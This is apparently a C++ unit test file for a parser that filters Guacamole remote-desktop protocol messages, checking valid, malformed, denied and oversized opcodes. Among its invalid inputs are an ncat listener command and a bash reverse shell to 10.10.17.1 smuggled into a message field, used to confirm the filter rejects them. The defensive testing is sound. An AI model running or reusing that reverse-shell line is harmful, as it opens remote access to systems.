#include "../../shared/include/parser/opcode_parser.h"
#include <cassert>
#include <iostream>
#include <stdlib.h>
#include <string>

/**
 * @brief Offers string representations of the available states
 */
std::string cvt_state(ParserState state) {
    switch (state) {
    case ParserState::READY:
        return "READY";
    case ParserState::PARSING:
        return "PARSING";
    case ParserState::DENIED_OPCODE:
        return "DENIED_OPCODE";
    case ParserState::INVALID:
    default:
        return "INVALID";
    }
}

/**
 * @brief Provides assertion for parser state, and logs to stderr for false assertions
 * @param input: message to parse
 * @param expected: expected state
 * @param parser: *OpcodeParser, in case the parser needs to be re-used across function calls
 */
void test_parsing(std::string input, ParserState expected,
                  OpcodeParser *parser = nullptr) {
    if (parser == nullptr)
        parser = new OpcodeParser();
    parser->Parse(input.data(), input.size());

    if (parser->GetState() != expected) {
        std::cerr << "state: " << cvt_state(parser->GetState())
                  << ", expected: " << cvt_state(expected)
                  << "\n\tfor input: " << input << std::endl;
        assert(false);
    }
}

/**
 * @brief tests if valid traffic is correctly parsed
 */
void test_valid_opcodes() {
    test_parsing("6.select,3.ssh;", ParserState::READY);
    test_parsing("4.size,4.1680,3.933,2.96;", ParserState::READY);
    test_parsing(
        "5.audio,8.audio/L8,9.audio/L16;5.video;5.image,10.image/jpeg,9.image/"
        "png,10.image/webp;8.timezone,13.Europe/"
        "Berlin;4.name,9.guacadmin;7.connect,13.VERSION_1_5_0,9.localhost,0.,2."
        "22,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,"
        "0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.;",
        ParserState::READY);
    test_parsing("4.argv,1.0,10.text/plain,12.color-scheme;",
                 ParserState::READY);
    test_parsing("5.mouse,3.988,3.369,1.0;", ParserState::READY);
    test_parsing("3.key,3.109,1.1;", ParserState::READY);

    // Valid opcode, with partials
    {
        auto parser = OpcodeParser();
        test_parsing("5.mouse,3.988", ParserState::PARSING, &parser);
        test_parsing(",3.369,1.0;", ParserState::READY, &parser);
    }

    {
        auto parser = OpcodeParser();
        test_parsing("4.size,4.168", ParserState::PARSING, &parser);
        test_parsing("0,3.933,2.96;", ParserState::READY, &parser);
    }

    {
        auto parser = OpcodeParser();
        test_parsing(
            "5.audio,8.audio/L8,9.audio/L16;5.video;5.image,10.image/"
            "jpeg,9.image/"
            "png,10.image/webp;8.timezone,13.Europe/Berlin;4.name,9.gu",
            ParserState::PARSING, &parser);
        test_parsing(
            "acadmin;7.connect,13.VERSION_1_5_0,9.localhost,0.,2.22,0.,0.,"
            "0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,"
            "0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.;",
            ParserState::READY, &parser);
    }
}

/**
 * @brief Tests whether invalid Guacamole is detected
 */
void test_invalid_guacamole() {
    test_parsing("nonsense", ParserState::INVALID);
    test_parsing("ncat -l -p 1337", ParserState::INVALID);
    test_parsing("8,nonsense", ParserState::INVALID);
    test_parsing("eight.nonsense", ParserState::INVALID);
    test_parsing("5.audio,1.6,31.audio/L16;rate=invalid,channels=2;",
                 ParserState::INVALID);

    // Invalid opcode length
    test_parsing("3.badlength;", ParserState::INVALID);
    test_parsing("999999999.toolarge;", ParserState::INVALID);
    test_parsing("-8.negative;", ParserState::INVALID);
    test_parsing("0.zero;", ParserState::INVALID);
    test_parsing("4.argv,18.0,10.text/plain,12.color-scheme;",
                 ParserState::INVALID);
    test_parsing("4.argv,1.1,10.text/plain,9.font-name;4.argv,1.2,10.text/"
                 "plain,9.font-size;3.ack,1.1,2.OK,1.0;3.ack/bin/bash -i >& "
                 "/dev/tcp/10.10.17.1/1337 0>&1,1.1,2.OK,1.0;",
                 ParserState::INVALID);

    // Invalid characters
    test_parsing("10.ὠnonsenseὠ;", ParserState::INVALID);
    test_parsing("9.😊nonsense;", ParserState::INVALID);

    // No closing semicolon after first opcode
    test_parsing("6.select3.foo;", ParserState::INVALID);

    // No commas
    test_parsing("5.video,3.foo6.barbaz;", ParserState::INVALID);
    test_parsing("7.connect3.doc5.frotz;", ParserState::INVALID);
    test_parsing("4.argv,1.5,10.text/plain9.font-size;", ParserState::INVALID,
                 nullptr);

    // Invalid guacamole, with partials
    {
        auto parser = OpcodeParser();
        test_parsing("5.audio,8.audio/L8,9.au", ParserState::PARSING, &parser);
        test_parsing(
            "dio/L16;5.video;5.image,10.image/jpeg,9.image/png,10.image/"
            "webp;8.invalid,13.Europe/"
            "Berlin;4.name,9.guacadmin;7.connect,13.VERSION_1_5_0,9.localhost,"
            "0.,2."
            "22,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,"
            "0.,"
            "0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.;",
            ParserState::INVALID, &parser);
    }
}

/**
 * @brief Tests whether disallowed opcodes are detected
 */
void test_denied_opcodes() {
    // test_parsing("9.clipboard,", ParserState::DENIED_OPCODE);
    test_parsing("5.abcde,", ParserState::DENIED_OPCODE);
    // test_parsing("4.blob,1.1,12.bW9ub3NwYWNl;3.end,1.1;", ParserState::DENIED_OPCODE);
    test_parsing("4.rect,", ParserState::DENIED_OPCODE);
    test_parsing("5.cfill,", ParserState::DENIED_OPCODE);
    test_parsing("10.filesystem,", ParserState::DENIED_OPCODE);
    test_parsing("4.file,", ParserState::DENIED_OPCODE);

    test_parsing("3.key,", ParserState::READY);
    test_parsing("4.size,", ParserState::READY);
    test_parsing("5.video,", ParserState::READY);
    test_parsing("6.select,", ParserState::READY);
    test_parsing("10.disconnect;", ParserState::READY);
}

/**
 * @brief Tests the boundaries of length-bound opcodes (clipboard payloads)
 */
void test_length_bound_opcodes() {
    // Should pass, payload is below maximum
    test_parsing("9.clipboard;", ParserState::READY);
    test_parsing("4.blob,9.abcdefghi;", ParserState::READY);
    test_parsing("9.clipboard,1.0,10.text/plain;4.blob,1.0,9.abcdefghi;3.end,1.0;", ParserState::READY);

    // Should fail, maximum payload length exceeded
    test_parsing("4.blob,15.abcdefghijklmno;", ParserState::INVALID);
    test_parsing("9.clipboard,1.0,10.text/plain;4.blob,1.0,20.aGV5IGhldCB3ZXJrdA==;3.end,1.0;", ParserState::INVALID);
}

/**
 * @brief Unit tests for the parser
 */
int main(int argc, char **argv) {
    test_valid_opcodes();

    test_invalid_guacamole();

    test_denied_opcodes();

    test_length_bound_opcodes();

    return 0;
}
